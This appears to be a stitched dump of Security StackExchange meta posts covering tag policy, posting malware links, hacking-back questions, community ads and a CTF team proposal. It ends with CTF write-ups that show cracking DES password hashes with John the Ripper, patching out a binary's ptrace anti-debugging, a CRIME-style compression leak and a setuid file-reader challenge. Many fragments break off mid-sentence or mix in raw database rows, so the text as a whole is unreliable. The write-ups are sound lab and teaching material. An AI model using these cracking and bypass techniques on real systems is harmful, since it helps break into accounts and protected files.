<p><em>If it is in a grey area</em>, Rory Alsop's suggestion makes sense to me: figure out if it is high-value to us or not; if it is high-value, leave it here; if it is not high-value to us, migrate to SU and let them deal with it, or close it.</p>

<p>If you post a question describing specific vulnerability in a particular version of a particular web site and asking whether it is indeed a valid vulnerability, well, that might end up being a narrow and localized question.  It would probably be localized in applicability, because it is only relevant to a single web site.  (However, the applicability might depend upon how widely-used the web site is.)  It would probably be localized in time, because it would only be relevant to that particular version of the software and would become irrelevant as soon as the website is updated.  (However, the applicability might depend upon how novel and interesting the vulnerability is in its own right, and whether there are any new lessons of lasting interest to be derived from it.)</p>

<p>Anyway, I'm just guessing and speculating, so don't take my answer too seriously.  I think one way to approach it is to ask yourself: is this the sort of question that is of lasting interest to a significant community of folks?  If yes, it is probably on-topic.  If not, it might squeak by, but it doesn't sound like a clear-cut case that is on-topic.</p>

<p>If you're not sure whether the question is on-topic, I suggest posting it and then folks can form their own opinion once they have something specific to look at.  At worst, if it is off-topic, it'll be closed, and no great harm done.</p>

<p>And, of course, it is possible your experience with this vulnerability might suggest a question of broader interest: e.g., how to confirm whether such-and-such class of vulnerabilities are indeed exploitable; how to avoid such-and-such type of vulnerability when building web applications; how to report vulnerabilities in a way that maximizes the chances that the public interest will be served; etc.  Those could be great questions for this site, if they haven't already been asked here.</p>

<p>I know that sometimes some technical people use the phrase ""<a href=""https://en.wikipedia.org/wiki/Web_service"" rel=""nofollow noreferrer"">Web service</a>"" to refer to a particular method of building web applications, using WSDL, SOAP, etc., as standardized by W3C.  Personally, I find this a confusing use of language, as many ordinary users understand the phrase ""web service"" to refer to a web site or web application that provides something useful to them.</p>

<p>Anyway, looking through the questions currently tagged with the <a href=""https://security.stackexchange.com/questions/tagged/web-service"" class=""post-tag"" title=""show questions tagged &#39;web-service&#39;"" rel=""tag"">web-service</a>, the usage seems to be all over the place.  I don't see any evidence that it is being reserved for W3C-style ""Web services"" technology (with WSDL and all that other gunk).  Instead, it seems to be used in the sense that ordinary users would expect -- effectively, as just a synonym for ""web application"".</p>

<p>Should we make <a href=""https://security.stackexchange.com/questions/tagged/web-service"" class=""post-tag"" title=""show questions tagged &#39;web-service&#39;"" rel=""tag"">web-service</a> a synonym of <a href=""https://security.stackexchange.com/questions/tagged/web-application"" class=""post-tag"" title=""show questions tagged &#39;web-application&#39;"" rel=""tag"">web-application</a>, and phase out the use of <a href=""https://security.stackexchange.com/questions/tagged/web-service"" class=""post-tag"" title=""show questions tagged &#39;web-service&#39;"" rel=""tag"">web-service</a>?

<p>Of the rest, I see the tag as being very much needed, and specific. Note that I am not referring (nor is the tag) only to SOAP/WSDL Web Services, but any type of ""web API"" - This does include SOAP and WSDL, but also REST, JSON, XML RPC, and more.<br>
There are substantial issues specifically to non-browsing Web calls (for lack of a non-recursive term), such as session management, SSL channels, and more.  </p>

Going forwards, it is probably simplest to post your favourite Questions of the week as answers on this question, and vote for your which ones you want to see. Once questions are accepted and posted we will delete them off here allowing the next most popular to rise to the top. So if you had a favourite question which didn't get selected in a previous week it may yet have it's turn in the spotlight.</p>

<p>There may be ones which are hot topics that week - and these may get posted despite not being at the top of the pile. Discussion in <a href=""http://chat.stackexchange.com/rooms/151/the-dmz"">the DMZ</a> will identify and select these.</p>

<p>Please post any question that you feel is of worth and the reason why as an answer below. Try not to promote your own questions or answers for publicity's sake. We are looking for questions that are of great interest, or have exceptional answers. If you like a posted question then vote it up. Each week we are going to try to post about the question and its contents. Also, have a look at the blog to check it hasn't already been written about.</p>

<p>When submitting a QotW, please indicate if you would be <strong>interested in writing about it</strong> for the blog. This is a factor which we take into consideration when selecting what to blog about - we need a post we can actually say something interesting about, it shouldn't be something we've written about too much before, and it helps to have somebody interested in writing the article.</p>

<p>I repeat - <strong>volunteer authors are always welcome</strong> - we get a wider range of styles, and it puts less of a load on the regulars</p>

<p>Note to the answerers, if you dig a question, you can always submit a draft blog post about it, even if its not picked as QotW. Contact a moderator, or come and chat in the DMZ if you need more information.</p>

<p>Posts can be written whenever you like - if we have a queue of good blog posts then that can tide us through holidays or times when folks are busy.</p>

1021,2,2012-10-04T12:58:06.773,1,,"<p>I think the problem is more a question of contrast. Personally, I have no problem concentrating on the ""grayed out"" parts, as long as the visited and unvisited links differ enough; it does not matter much (for me ! This is a perception thing, hence depends quite a lot on who does the perceiving) whether the visited links use the lighter or the darker colour. However, I tend to find the two colours too close to each other.</p>

<p>It is even a problem with my 23"" LCD. Like all LCD panels, its contrast depends on the angle of vision, and since this panel is rather big and close to my eyes, the pixel on the top of the screen and those on the bottom are seen by the operator (me) from quite distinct angles, to the point that a <em>visited</em> link on the top and an <em>unvisited</em> link on the bottom will appear to me with the same apparent tint.</p>

<p>I currently handled the issue by adding an extra LCD display, an older 17"" LCD which happens to be much less affected; I do my Web browsing on that display. Still, I think that this highlights the fact that the two colours are a bit too similar to each other.</p>

1027,2,2012-10-05T14:40:52.627,3,,"<p>Actually, since this is a <em>security</em> site, and I expect almost any algorithm-specific question to be on the <a href=""http://cryptography.stackexchange.com"">Cryptography</a> site instead of here, I personally think we shouldn't even have any algorithm-specific tags, <em>at all</em>.   </p>

<p>Rather, I would instead of both <a href=""https://security.stackexchange.com/questions/tagged/sha2"" class=""post-tag"" title=""show questions tagged &#39;sha2&#39;"" rel=""tag"">sha2</a> and <a href=""https://security.stackexchange.com/questions/tagged/sha256"" class=""post-tag"" title=""show questions tagged &#39;sha256&#39;"" rel=""tag"">sha256</a>, I would retag them both as <a href=""https://security.stackexchange.com/questions/tagged/hash"" class=""post-tag"" title=""show questions tagged &#39;hash&#39;"" rel=""tag"">hash</a>; I would do the same for <a href=""https://security.stackexchange.com/questions/tagged/sha"" class=""post-tag"" title=""show questions tagged &#39;sha&#39;"" rel=""tag"">sha</a> and <a href=""https://security.stackexchange.com/questions/tagged/sha-1"" class=""post-tag"" title=""show questions tagged &#39;sha-1&#39;"" rel=""tag"">sha-1</a>. Same with <a href=""https://security.stackexchange.com/questions/tagged/md5"" class=""post-tag"" title=""show questions tagged &#39;md5&#39;"" rel=""tag"">md5</a>.   </p>

<p>I would do the same for encryption algorithms, too - e.g. instead of <a href=""https://security.stackexchange.com/questions/tagged/aes"" class=""post-tag"" title=""show questions tagged &#39;aes&#39;"" rel=""tag"">aes</a> and <a href=""https://security.stackexchange.com/questions/tagged/3des"" class=""post-tag"" title=""show questions tagged &#39;3des&#39;"" rel=""tag"">3des</a> simply have <a href=""https://security.stackexchange.com/questions/tagged/encryption"" class=""post-tag"" title=""show questions tagged &#39;encryption&#39;"" rel=""tag"">encryption</a>, or possibly <a href=""https://security.stackexchange.com/questions/tagged/symmetric-encryption"" class=""post-tag"" title=""show questions tagged &#39;symmetric-encryption&#39;"" rel=""tag"">symmetric-encryption</a>.   </p>

<p>My point is, most of those questions either: (a) should be asked on crypto, because it is about the algorithm details; or (b) mostly irrelevant which algorithm is used, from a security management point of view; or (c) apply to a range of algorithms, or the specific algorithm is not known in the question (e.g. which algorithm to use in a specific situation). </p>

<p>If we were to promote white, grey, black hats... and those ""virtual hats"" represent the online persona/intention of a given user, I wonder how that would affect the perception of this site.</p>

<p>Here is a fictional example:  Suppose everyone chose a black hat.  A newcomer to this site would make certain assumptions about this site in regards to the legality of the content here.  This is something that most corporate IT Security shops would be wary of.</p>

<p>Alternatively, if the dominant selection was a hat of a given color, then the lines of the community would be more clearly drawn.  Some online pseudonyms would get singled out for their intention (or playful affiliation).  Some gut-reaction upvotes or downvotes may occur.</p>

<p>Finally, there is the possibility for a user who selects ""white hat"" to appear more trusted to less knowledgeable users.  This malicious answerer could propagate links to malware or convey invalid information. </p>

<p><strong>Question</strong></p>

<p>Since this <a href=""https://security.meta.stackexchange.com/q/117/396"">previous Meta.SE question</a> says it's OK to post exploit code, why did I get downvoted and have the exploit code I linked to redacted?  </p>

<p>Should I have downloaded and embedded the malicious code?</p>

<p><strong>My rationale</strong></p>

<p>I included the URLs for 6 reasons</p>

<ul>
<li><p>The links were not ""clickable"".  No http:// prefix and I formatted them using code view.</p></li>
<li><p>The URLs are common in this instance of the attack.  This could enhance SEO for anyone searching for anything similar.</p></li>
<li><p>Perhaps there is a Whois search type where I can find a common registrant and block all their domains</p></li>
<li><p>The meta discussion I linked to above says exploit code is conditionally  permitted.  A hyperlink is one degree of separation.  Does this imply I should have pasted the actual code of the target?</p></li>
<li><p>The ""real"" malicious code has been taken down and responds with a 503 gateway down error.</p></li>
<li><p>I included instructions on how to safely view the contents of the URL using Malzilla, with a hyperlink.</p></li>
</ul>

<p>In this case I was asking for specific, not general assistance and took every possible precaution.  It seems inconsistent that we permit the detailed posting of exploits that happen within a computer program, but disallow linking to URLs that are the same.  I think this type of question will become more relevant over time as the web-based APIs become more popular.</p>

1062,2,2012-11-19T21:42:18.553,5,,"<p>Why were you downvoted?  Who knows?  Only the down-voter can answer that. People are able to down-vote for any reason they like, including personal whim or because they were feeling grumpy that day or because they don't like you.  I know it can be annoying.  I don't have much more to say on that, so let's move on to the policy question, of what this site <em>ought</em> to encourage/discourage:</p>

<p><strong>The policy question.</strong> I don't think it's <em>necessarily</em> wrong or impermissible or inappropriate to post exploit code or identify malicious sites.  I think it depends upon the circumstances.  I do think there are some good practices you should follow if you are going to post links to malicious sites or snippets of malicious code:</p>

<ul>
<li><p>Ask yourself, is it really necessary to post this information? Is it really very likely that this information will help someone provide a better answer, or is it just window-dressing?</p></li>
<li><p>Ask yourself, am I putting people at risk?  For instance, including a clickable link to a known-malicious site is not a good idea, as people might accidentally click on it and get pwned.  If you really need to identify the site, you can still provide a URL without making it clickable.  Also, if you know that the link is malicious, provide a prominent warning next to it.</p></li>
<li><p>Ask yourself, am I making the question more useful to others, or less useful?  One of the purposes of this site is to create archival-quality answers to questions of broad interest.  (In other words, it's not just about helping you -- that's one goal, but another goal is to document answers that may help others.)  Posting a specific malware link/sample risks making your question a lot narrower in scope and more localized in time.  So, ask yourself: will posting the link increase the odds of getting general answers that will be broad utility to lots of other users, or will it have the effect of reducing the utility of answers by tending to make people focus in narrowly on a single malware sample?</p>

<p>Malware comes and goes.  I expect that in most cases, it is more helpful to generalize and ask the general question, rather than to post a question about a single malicious site/malware sample.  Thus, if you find yourself wanting/needing to post a malware link, that's a red flag that should trigger you to ask yourself whether your question might be too narrow and whether you can generalize your question.</p></li>
</ul>

<p>In general, I would be reluctant to post malicious links in most cases.  I certainly accept that there might be some situations where they are appropriate ... but I also expect that, for the reasons listed above, in most cases you won't need to post malicious links and indeed removing the malicious links may lead to a better question.</p>

<p><strong>Your specific post.</strong> I don't think you did anything <em>wrong</em> in the way you posted some malware links.  You <em>did</em> take steps to avoid putting people at risk, and that's laudable.  You did exactly what I would want people to do, if they were going to post malicious links.  And no, I don't think you violated any site policy or site rules, at least not as far as I know.</p>

<p>That said, I think your question is <em>a better question</em> after the edits to remove those links.  It was a fine question as you originally posted it -- but it's <em>an even better question</em>, now that you've removed the links.  Why?  Because now the question has broader applicability.  It addresses the general situation of how to report malicious URLs, which is something that is likely to be of broad interest and pops up all the time, not just your personal situation with this particular spam campaign (which is probably a very time-limited event and not likely to be of lasting interest to others).</p>

<p>I know when you get downvoted, it's easy to feel like you got spanked or punished for no reason.  I hope you won't feel that way.  I think you've contributed a great question to the site, and one that the process has helped make even better, so you should feel proud that you've contributed something good to the world.  I appreciate it, and I'm sure other visitors will as well.  I upvoted your question, and I expect others will as well.</p>

hus, unless it's very generic and high-level, a question about legality would be problematic, and thus closed (if it's just about legality). </p>

<p>As for ethics, this can be very subjective, which doesn't really lead to good answers. There is a subset of ethics that <em>can</em> be answered cleanly, though, it would still be tricky to focus that. (E.g. CISSP's Code of Ethics, or any other defined code.)</p>

<p>I think there is some wiggle-room on the above, but it is not much.<br>
For example, you could ask what laws or regulations would apply, depending on specific location. Or you could ask about the expected consequences. </p>

<ol>
<li><p>You should separate legality from ethics.  Asking about both in the same question would be too broad.  Ask two questions, if you want to know both.</p></li>
<li><p>Asking about the ethics of hacking back is probably OK.  Please make sure to do some research of your own first (""do your homework"") and show what you came up with so far.</p></li>
<li><p>Asking about the legality of hacking back is probably not going to lead to a useful answer.  The short version is ""if you have authorization, it's probably legal; if you don't have authorization, it probably is illegal"" and for anything at all non-trivial, ""talk to a lawyer"".</p></li>
<li><p>The legality of hacking in general is fairly well-covered already by <a href=""https://security.stackexchange.com/q/6355/971"">At what point does &quot;hacking&quot; become illegal? (US)</a> so a question about legality would only be on-topic if it was clear what's different about this.  Also, questions about legality tend to be jurisdiction-specific, so you'd probably need to specify what country you are concerned with.</p></li>
<li><p>If you do ask about legality, do your homework first.  (Read, e.g., the blog posts on the Volokh Conspiracy about the legality of hacking back first before posting.)</p></li>
<li><p>Finally, I don't think the community on this site tends to have a great deal of legal expertise, so that kind of question might not get the kind of answers you are looking for, or might be closed because it just isn't a good fit for our community's interests and expertise.  Once it gets into anything at all non-trivial -- which ""hacking back"" probably is -- then I suspect the best we're likely to to be able to do is tell you to talk to your lawyer.</p></li>

<p>If you do move it over, here are some considerations for you to take into account so you can improve your question:</p>

<p>I think the question could be re-focused or re-formulated in a way that would make it a better fit for this site.  The question, as you've currently posted it, is a bit narrowly focused on your particular situation, and thus less likely to be useful to others visiting the site.  I think for this site, the following sorts of questions would be more useful (i.e., more likely to be of use to other visitors):</p>

<ul>
<li><p>Is it more secure to use rsync to connect from my home device to my work device, or vice versa?</p></li>
<li><p>Is it safe to use rsync without SSH?</p></li>
</ul>

<p>Keep in mind one of the primary purposes of this site is to serve as a repository for high-quality answers to questions that many folks are likely to have, so to the extent that you can phrase your question in that form, the more likely it will get useful answers here.  Therefore, I encourage you to think about how to get to the core of your question, in as broadly-applicable a form as possible.</p>

<p>To the extent that your question is asking about how to configure some specific device (e.g., your NAS device, your Linux box) to perform some specific task, that aspect is not a good fit for this site and is probably a better fit for some other site (Unix.SE? ServerFault?).</p>

<h3>What are Community Promotion Ads?</h3>

<p>Community Promotion Ads are community-vetted advertisements that will show up on the main site, in the right sidebar. The purpose of this question is the vetting process. Images of the advertisements are provided, and community voting will enable the advertisements to be shown.</p>

<h3>Why do we have Community Promotion Ads?</h3>

<p>This is a method for the community to control what gets promoted to visitors on the site. For example, you might promote the following things:</p>

<ul>
<li>cool web app related open source apps</li>
<li>the site's twitter account</li>
<li>cool events or conferences</li>
<li>anything else your community would genuinely be interested in</li>
</ul>

<p>The goal is for future visitors to find out about <em>the stuff your community deems important</em>. This also serves as a way to promote information and resources that are <em>relevant to your own community's interests</em>, both for those already in the community and those yet to join. </p>

<h3>Why do we reset the ads every year?</h3>

<p>Some services will maintain usefulness over the years, while other things will wane to allow for new faces to show up. Resetting the ads every year helps accommodate this, and allows old ads that have served their purpose to be cycled out for fresher ads for newer things. This helps keep the material in the ads relevant to not just the subject matter of the community, but to the current status of the community. We reset the ads once a year, every December.</p>

<p>The community promotion ads have no restrictions against reposting an ad from a previous cycle. If a particular service or ad is very valuable to the community and will continue to be so, it is a good idea to repost it. It may be helpful to give it a new face in the process, so as to prevent the imagery of the ad from getting stale after a year of exposure.</p>

<h3>How does it work?</h3>

<p>The answers you post to this question <em>must</em> conform to the following rules, or they will be ignored. </p>

<ol>
<li><p>All answers should be in the exact form of:</p>

<pre><code>[![Tagline to show on mouseover][1]][2]

   [1]: http://image-url
   [2]: http://clickthrough-url 
</code></pre>

<p>Please <strong>do not add anything else to the body of the post</strong>. If you want to discuss something, do it in the comments.</p></li>
<li><p>The question must always be tagged with the magic <a href=""/questions/tagged/community-ads"" class=""post-tag moderator-tag"" title=""show questions tagged &#39;community-ads&#39;"" rel=""tag"">community-ads</a> tag. In addition to enabling the functionality of the advertisements, this tag also pre-fills the answer form with the above required form.</p></li>
</ol>

<h3>Image requirements</h3>

<ul>
<li>The image that you create must be <strong>220 x 250 pixels</strong></li>
<li>Must be hosted through our standard image uploader (imgur)</li>
<li>Must be GIF or PNG</li>
<li>No animated GIFs</li>
<li>Absolute limit on file size of 150 KB</li>
</ul>

<h3>Score Threshold</h3>

<p>There is a <strong>minimum score threshold</strong> an answer must meet (currently <strong>6</strong>) before it will be shown on the main site.</p>

<p>You can check out the ads that have met the threshold with basic click stats <a href=""https://security.meta.stackexchange.com/ads/display/1085"">here</a>.</p>

Those can't both be true.  The question <em>does</em> say ""From a security viewpoint, what are the benefits/drawbacks for..."", so the question is already scoped to just a security perspective.  If there are no security implications, then the question will receive an answer saying there are no significantly security implications (hopefully with some explanation), and that seems better than closing the question.</p>

<p>For me, this does feel like a plausibly on-topic question, in a way that I can't really justify rationally (and thus which may be faulty or illogical).  I have not yet heard an argument for closing it that persuades me.  That doesn't mean there is no such reason, just that the reasons I've heard yet haven't persuaded <em>me</em>, for what little that's worth.</p>

<p>Then again, personally I may be biased towards being accepting of this kind of question.  Anyway, I have no strong confidence that my position is the right one, but I did want to make sure the opposing viewpoint got aired.</p>

</ul>

<h2>CTF TIME</h2>

<p><a href=""http://ctftime.org/"" rel=""nofollow noreferrer"">CTF Time</a> is a website dedicated to CTF challenges. We will subscribe a team and we will...</p>

<p><img src=""https://i.stack.imgur.com/hPX7H.jpg"" alt=""enter image description here""></p>

<p>There are basically 4 types of challenges:</p>

<ul>
<li>Exploiting</li>
<li>Web</li>
<li>Reversing</li>
<li>Forensics</li>
</ul>

<p>And then there are also the occasional misc challenges. So basically we will have people working on each of the categories. Preferably a more experienced person in the field with less experienced people in the field so we can factor in some learning. To be good we should have about 4 people/challenge. A team of 16 people would be ideal. We can rotate the team</p>

<h2>Basic Requierements</h2>

<ul>
<li><strong>Have at least 400 rep on security.SE or have more than a combined 2000 rep on your network profile in related fields (Crypto,Stackoverflow, Webmasters, Serverfault,... ) sites in an unrelated field (Arqade, The Workplace, ...) do not count!</strong> </li>
<li>Understanding of Basic TCP/IP</li>
<li>Understanding of at least 1 programing (java,c,c++,c#) and 1 scripting language (preferably, php, python, perl or ruby)</li>
<li>Have basic understanding of at least one of the topics (knowing what things like XSS or SQL injection are)</li>
</ul>

<h2>Things we need</h2>

<p>(I should be able to provide this on my personal systems, but should SE have something like this it  would be nice)</p>

<ul>
<li>IRC server with a private channel or a private chatroom on SE</li>
<li>A Wiki to centralize all of our learnings. </li>
</ul>

<h2>How much time will this take of me? </h2>

<p>You have to know most CTF's last 2 days, to be able to complete a challenge you will need to be able to commit around 4 - 6 hours at least.</p>

<h2>Team</h2>

<p>This is a team effort, don't expect this thing to be easy, it isn't. It will take a lot of time and might even give you some frustration, but when you are able to decipher a challenge you will be having a digital orgasm.</p>

<p><img src=""https://i.stack.imgur.com/dcNB6.jpg"" alt=""enter image description here""> </p>

<h2>Code of Conduct</h2>

<ul>
<li>Common sense</li>
<li>Don't do or share anything illegal</li>
<li>Always follow the CTF challenges rules</li>

<p>Admittedly my Sec.SE stuff is from the perspective of a moderator, so I have this on my <a href=""http://www.linkedin.com/profile/view?id=3402893"" rel=""nofollow"">LinkedIn profile</a>:</p>

<blockquote>
  <p><strong>Moderator</strong> </p>
  
  <p>security.stackexchange.com January 2011 – Present (2 years 2
  months)</p>
  
  <p>I am one of four moderators of the global security
  question and answer site, which is part of the wider Stack Exchange
  family of Q&amp;A sites. I also administer the associated security blog at
  security.blogoverflow.com</p>
  
  <p>From August 2012, I have also moderated the Personal Productivity
  Stack Exchange site.</p>
</blockquote>

<p>But to be honest, the discussion is usually around what Sec.SE does, not really what the moderator role is. When I am interviewing individuals, I like to see things like member/contributor to OWASP/SE/ISACA/BCS/ISF etc as it gives me another avenue of discussion to delve into what someone is like - and then also gives me a chance to quickly look through some of the stuff the have answered (in the case of Sec.SE) and understand their approach and whether they will fit into my team.</p>

<p>The advantage of pointing to a Careers profile, instead of straight to Sec.SE, is that it allows me to highlight the posts any way I want, and also include posts from other sites (e.g. the <a href=""https://security.stackexchange.com/questions/tagged/security"" class=""post-tag"" title=""show questions tagged &#39;security&#39;"" rel=""tag"">security</a> tag on StackOverflow from before Sec.SE...).<br>
This really allows you to build a portfolio of your ""work"", since so much of what we do is not ""showable"" (even as much as code).

<p>Yeah, well, that and half the questions on Stack Exchange.</p>

<p>It's better to have a question with precise requirements than a question that is so vague that you can't answer anything useful.</p>

<p>Such questions should generally be closed as “not constructive” when the requirements are too vague. When the requirements are precise enough, these are worthwhile questions, but answers recommending a specific product are often not very good either because product choice tends to be down to personal preferences or habits. It's usually better to edit the question to make it less of a “catch this fish for me” and more of a “teach me how to fish”. Make the question ask what the important criteria are to select a product.</p>

<p>That being said, don't go too hard on questions that end up being product recommendations. Sometimes a recommendation from someone with more experience is exactly what you need. Answers like “I used X in a 1000-user shop, and it was good, but it couldn't handle the load when we increased past 10,000 users, so we tried Y and Z, and Y had better support from the vendor” are valuable.</p>

<p>As the EFF notes, under the proposed legislation, talking about computer crimes would be considered conspiracy, and pushable by substantial jail time.

<p>As a general comment: I think you might fare better on this site if you change your attitude a bit.  You are new to the site.  I notice that you've made a number of criticisms and accusations: e.g., that the site policy is unfair, the moderators are after you personally, that people are just using you for entertainment, all sorts of stuff.  I think you need to spend some time learning how to use the site the way it is intended to be used, and learning about why the rules are set up the way they are, before you will be able to form an informed opinion about the site.</p>

<p>Also: this site is not here to help you, personally, out.  Rather, it is intended as a public good.  I realize it may not be right for everyone.  (This might sound harsh, but it's not meant that way.)  Many of us find the site is extremely valuable for us, and we want to keep it that.  We realize that there tend to be good reasons why many of the rules are the way they are; in many cases, they are based upon direct personal experience.  If you find the site is not valuable for you, then maybe this is not the right site for you.</p>

<p>I'm certainly not saying nothing here can be improved, or that your feedback is unwelcome -- but I am saying it might help to first understand the culture and norms here before you start critiquing it.  And, I am saying you should try to be nice to others here: they are not out to get you, they are trying to help and to ensure the site remains a helpful resource to others.  Start from the assumption that everyone is acting in good faith and has good reasons for why they are behaving how they are, and you might find the interactions start to become a bit more pleasant for you.  Please understand that I'm not trying to drive you away; I'm just trying to help you understand some of the dynamic behind the reactions you are getting.</p>

<ul>
<li>Unnecessary bullet points.</li>
<li>Poor quality / missing description of what the tag is about.</li>
<li>Not concise enough.</li>
</ul>

<p>Here are my reasons:</p>

<p><strong>Bullet points</strong><br />
Bullet points in tags are <em>rarely</em> necessary for tags, outside of the full tag wiki. They look bad in the popout, and should only be used if you're listing things. There's no reason to use them to format your entire entry. Instead, use proper paragraphs.</p>

<p><strong>Poor quality / missing description</strong><br />
Tag summaries are meant to concisely explain <em>what</em> a term means, and in the case of potentially ambiguous terms, when they should be used. In some cases, you neglected to mention what the tag actually meant at all. In others, you only half explained it and added needless cruft to bulk out the entry.</p>

<p><strong>Not concise enough</strong><br />
The tag wiki guideline says the following:</p>

<blockquote>
  <p>The tag wiki excerpt is a brief plain text introduction to the topic that the tag represents. It is shown at the top of tag question lists, and as a tooltip wherever the tag appears. Complete this first! </p>
</blockquote>

<p>Some of your edits went into detail about tools, different types of attack / recon, detail around projects involved in the subject, etc. This is just too much for an excerpt. It should contain a simple, short explanation of what the term means, and what the tag should be used for if there is any confusion. Adding links to projects and other such formatting is useless in the excerpt, and often leads to link-rot in the full tag wiki.</p>

<hr>

<p>All in all, I rejected or heavily edited 5 of the 7 tags edits I reviewed, due to problems such as the above.</p>

<p>I applaud your efforts to improve our tags, because it's an area that many people don't focus in, but making poor quality edits often results in more work for reviewers. If you stick to the tag guidelines and keep things short and sweet, without unnecessary formatting, your tag edits would be much more likely to be accepted.</p>

<p><strong>'Secure_reader' - Solved by <em>MMavipc and Gilles</em></strong></p>

<p>A crypto/RE question</p>

<ul>
<li>""We found a wonderful new service you can use to secure all of your files with, though it is still in beta.

<p>@Giles Solution:</p>

<p>This was a misc/bonus points question. </p>

<ul>
<li>""Where does The Plague hide his money?""</li>
</ul>

<p>The answer was immediately obvious to me, It was a reference to the 1995 movie ""hackers"" which i've watched at least a hundred times (not even joking, i've watched it in B&amp;W ASCII (yay VLC plugins!)). 
MMavipc posted a <a href=""http://www.freeinfosociety.com/site.php?postnum=402"" rel=""nofollow noreferrer"">link to the script</a>, but missed the line <em>An account number scrolls below Cereal's chin.</em> in the script. I quickly pulled out my copy flicked through to the right scene and bam. <strong>03087-08351-27H</strong> Unnnlucky! :) We scored an easy 20 points. </p>

<p><strong>'hypercomputer-1' - Solved by <em>MMavipc</em></strong> (solved literally minutes after the comp closed!!!)</p>

<p>This was a RE/Binary challenge. </p>

<ul>
<li>For those who didn't play plaidCTF 2012: ""supercomputer"" was a reversing challenge that computed flags using really silly math (like adding in a loop instead of mulitplication). hypercomputer is easier... if you do it right :P

<p>We have a Linux amd64 executable trying to do something mysterious. It doesn't want to be traced (<code>ptrace(0,0,0,0)</code>); an easy workaround is to patch the binary to replace <code>ptrace</code> by something inoccuous like <code>read</code>. Also, the program tries to open <code>/dev/tty0</code>; patch this to <code>/dev/tty</code>.

<h2>Problem 2: compression [Cryptography]</h2>

<p>The goal is to find a 20-byte problem key $P$. We are told that $P$ only contains lowercase letters and underscore.</p>

<p>The script does the following:</p>

<ul>
<li>Generate a random 8-byte nonce $N$.</li>
<li>Write $N$.</li>
<li>Set $V := N$.</li>
<li><p>Repeat forever until the connection is closed:</p>

<ul>
<li>Read 4 bytes, interpreted as an integer $L$.</li>
<li>Read at most $L$ bytes, forming a string $M$.</li>
<li>Compress $M || P$ with zlib and encrypt the result with AES-CTR with the nonce $V$ and the fixed 256-bit key $K$, resulting in a string $C$.</li>
<li>Write the length of $C$ as a 4-byte integer.</li>
<li>Write $C$.</li>
<li>Set $V := V + |C|/16$.</li>
</ul></li>
</ul>

<p>In summary: compress the user's input, append the secret key, compress, encrypt, output the ciphertext.</p>

<p>This leaks the size of the compressed string, which in turn gives information about commonalities between the secret key and the user-chosen input. In a word: <a href=""http://en.wikipedia.org/wiki/CRIME_%28security_exploit%29"" rel=""nofollow noreferrer"">CRIME</a> (<a href=""https://security.stackexchange.com/questions/19911/crime-how-to-beat-the-beast-successor/19914#19914"">well known on Sec.SE</a>).</p>

<h2>Problem 16: secure_reader [Pwnable]</h2>

<p>The flag is in <code>/home/securereader/flag</code>. Only the <code>securereader</code> user can read it.</p>

<p>The program <code>/home/securereader/secure_reader</code> is setuid <code>securereader</code>. Let's try calling it:</p>

<pre><code>$ /home/securereader/secure_reader /home/securereader/flag
This may only be called by /home/securereader/reader
$ /home/securereader/reader /home/securereader/flag
File is not in a whitelisted directory!
</code></pre>

<p><code>strings /home/securereader/reader</code> shows <code>/tmp/</code> as a directory (and others that are unlikely to matter as they are from libc components). Lookie here, <code>/tmp/flag</code> has the same date, size and permissions as <code>/home/securereader/flag</code>!</p>

<pre><code>$ /home/securereader/reader /home/securereader/flag
This may only be called by /home/securereader/reader

<p>We can submit a name and get an encrypted password. A little experimentation shows that the password is always the same for a given name, and the encrypted password consists of 13 characters, the first two of which are always <code>fb</code>. Furthermore only the first 8 characters of the file name are significant. This looks like a traditional Unix DES password hash.</p>

<p>After logging in, we can read some files but not <code>flag</code> which is reserved to “my fuhrer”. Furthermore, if we pick <code>hitler</code> as a username, we aren't told what the encrypted password is. So let's find the encrypted password for <code>hitler</code>.</p>

<p>Get the encrypted password for some usernames and plug them into a password cracker. I used John the Ripper and waited overnight.</p>

<pre><code>cat &gt;passwd &lt;&lt;EOF
a:fbc4G6VBoVf/A:1:1:A:/bin/sh
b:fbN6QGgUKaE2Q:2:2:B:/bin/sh
EOF
john passwd
</code></pre>

<p>The password of user <code>a</code> is <code>ah4x0r</code> and the password of user <code>b</code> is <code>bh4x0r</code>. So the password of user <code>hitler</code> must be <code>hitlerh4x0r</code> which encrypts to <code>fboWsVzkSumM.</code>.</p>

<p>The flag is <code>99fa57bd69cdcfdd2e2fb6419e2994ca</code>.</p>

<h1>Invisible</h1>

<p><code>real.html</code> is a <a href=""http://compsoc.dur.ac.uk/whitespace/"" rel=""nofollow"">Whitespace</a> program.</p>

<p>The following perl snippet looks for integer constants with at least 3 digits that are pushed on the stack and that are followed by an instruction that ends with a newline. While crude, this is enough to yield the solution.</p>

<pre><code>&lt;real.html perl -ne '
    chomp;
    s/^  // or next;
    length &gt;= 3 or next;
    y/ \t/01/; s/^/0b/;
    print chr(oct($_))'
</code></pre>

<p>The output is <code>wEsGlHaInJgKThe key is We_are_Nasus     Cwrong</code>, and the flag is <code>We_are_Nasus</code>.</p>

<p>A more precise examination shows that passing <code>wslang</code> as input to the program makes it output the flag. The first part of the output of the Perl script above is <code>wslang</code> interlaced with jump labels for the comparison code.</p>

<h1>X95</h1>

<p><a href=""http://forbiddenbits.net/tasks/x95.txt"" rel=""nofollow"">http://forbiddenbits.net/tasks/x95.txt</a> contains a Perl script.</p>

<p>The perl script prints a random integer between 0 and 19 and reads a password. The password is encrypted with the <code>x0</code> function using the random integer as a key. The ciphertext is then transliterated and further munged.</p>

<p>The output of <code>x0</code> is a string of hexadecimal digits. It is transliterated to a different set of digits:</p>

<pre><code>0123456789abcdef
_`abcdefgh234567
</code></pre>

<p>In the end, we want <code>$dd</code> to match</p>

<pre><code>^.........................78874.....87897.....98658..87896865978788648788........65859865898659687897.*$
</code></pre>

<p>perl -le 'print chr for 33..126' | xargs -n1 -d\\n ./encoder1 $str2auth |grep substituted | grep -E --color '78($|8)|( |7)88' finds matches only for str2auth = 7 or 8.</p>

<p><code>87897</code> must come from <code>E</code> → <code>878978</code><br>
<code>98658</code> must come from <code>X</code> → <code>8658598658598</code><br>
<code>87896</code> must come from <code>D</code> → <code>878968</code><br>
--></p>

<p>With <code>$str2auth==8</code> and <code>2</code> transformed to <code>8</code> (requires the first character to be below 0x9f), the hex digits after <code>x0</code> map to:</p>

<pre><code>` 860
_ 859
a 861
b 868
c 863
d 864
e 865
f 878
g 873
h 874
2 88
3 89
4 96
5 97
6 98
7 99
</code></pre>

<p>So the encoded string must match</p>

